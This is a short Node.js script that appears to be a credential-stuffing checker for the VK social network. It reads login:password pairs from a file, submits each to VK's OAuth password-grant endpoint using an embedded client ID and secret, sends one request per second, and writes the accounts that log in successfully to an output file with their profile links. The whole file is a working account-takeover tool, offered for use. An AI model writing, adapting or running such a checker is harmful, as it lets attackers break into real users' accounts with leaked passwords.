var request = require("request");
var fs = require("fs");

var validArr = [];
var accounts = fs.readFileSync('accounts.txt', 'utf-8').replace(/\r/gi, '').split("\n");

fs.writeFileSync('./output/valid.txt', '');

var i = 0;

setInterval(function()
{
   if(i >= accounts.length)
    {
        fs.writeFileSync('./output/valid.txt', validArr.toString().split(",").join(""));
        console.log("Finished");
        process.exit();
    } 
    var login = accounts[i].substring(0, accounts[i].indexOf(':'));
    var password = accounts[i].substring(accounts[i].indexOf(':') + 1);

    doRequest(`https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=${login}&password=` + encodeURIComponent(password), (error, response) =>
    {
        if(error) return;
        var res = JSON.parse(response);
        if(res.error) return;
        var { access_token, expires } = res;
        doRequest(`https://api.vk.com/method/users.get?v=5.86&access_token=${access_token}`, (error, response) => 
        {
            if(error) return;
            validArr.push(login + ":" + password + " > https://vk.com/id" + response.toString().substring(response.indexOf('"id":') + 5).substring(9, response[i].indexOf(',')) + "\n");
        })
    })
    i++;
}, 1000);

function doRequest(url, callback)
{
  request(url, (error, response, body) => 
  {
    if(error) return callback(error);
    callback(null, body);
  });
}